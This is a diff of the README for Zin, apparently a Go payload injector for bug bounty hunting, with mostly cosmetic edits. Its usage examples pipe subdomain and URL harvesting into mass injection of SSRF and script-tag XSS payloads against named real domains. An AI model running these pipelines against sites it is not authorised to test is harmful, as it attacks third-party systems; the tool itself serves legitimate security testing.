@@ -1,7 +1,7 @@
 ![alt text](https://upload.wikimedia.org/wikipedia/commons/9/9a/Filled_Syringe_icon.svg)
 ##### Version 1.0
 
-# Zin
+# 😎 Zin 😎
 **A Payload Injector for bugbounties written in go**
 
 
@@ -20,8 +20,9 @@
 
 
 ### New Features
-- Pattern Matching in responses
-- Match Status Codes
+-✅ Pattern Matching in responses 
+
+-✅ Match Status Codes
 
 ### Arguments
 ```
@@ -50,38 +51,39 @@ May the bounties come
 ```
 
 
-### Install
+## Install
 
 `$ git clone https://github.com/ethicalhackingplayground/Zin && cd Zin && go build`
 
 
 
-##### SSRF Example
-`$ subfinder uber.com | gau | grep "=http" | ./Zin -c 80 -p http://10.82.214.84:31386/foobar.js -g "SUP3R_S3cret_1337_K3y"`
+### SSRF Example
+**`$ subfinder uber.com | gau | grep "=http" | ./Zin -c 80 -p http://10.82.214.84:31386/foobar.js -g "SUP3R_S3cret_1337_K3y"`**
 
-##### XSS Example
+### XSS Example
 
-`$ subfinder uber.com | gau| ./Zin -c 80 -p '"><script>alert(matchforthis)script>' -g "matchforthis"`
-
-
-##### Inject Multiple Payloads
-`$ cat hosts | gau | grep "&" | ./Zin -c 80 -pL <payloadfile>`
-
-##### Subdomain Scanning
-
-`$ subfinder -dL domains --silent | gau | ./Zin -c 80 -p <payload>`
+**`$ subfinder uber.com | gau| ./Zin -c 80 -p '"><script>alert(matchforthis)script>' -g "matchforthis"`**
 
 
-##### Only Test Parameters
+### Inject Multiple Payloads
+**`$ cat hosts | gau | grep "&" | ./Zin -c 80 -pL <payloadfile>`**
 
-`$ echo "google.com" | gau | grep "&" | ./Zin -c 80 -p '"><script>alert(matchthis)</script<"' -g "matchthis" ` 
+### Subdomain Scanning
 
-##### Multiple Hosts
+**`$ subfinder -dL domains --silent | gau | ./Zin -c 80 -p <payload>`**
 
-`$ cat hosts | gau | ./Zin -c 80 -p <payload>`
+
+### Only Test Parameters
+
+**`$ echo "google.com" | gau | grep "&" | ./Zin -c 80 -p '"><script>alert(matchthis)</script<"' -g "matchthis" `**
+
+### Multiple Hosts
+
+**`$ cat hosts | gau | ./Zin -c 80 -p <payload>`**
 
 
 **If you get a bounty please support by buying me a coffee**
 
+<br>
 <a href="https://www.buymeacoffee.com/krypt0mux" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
 
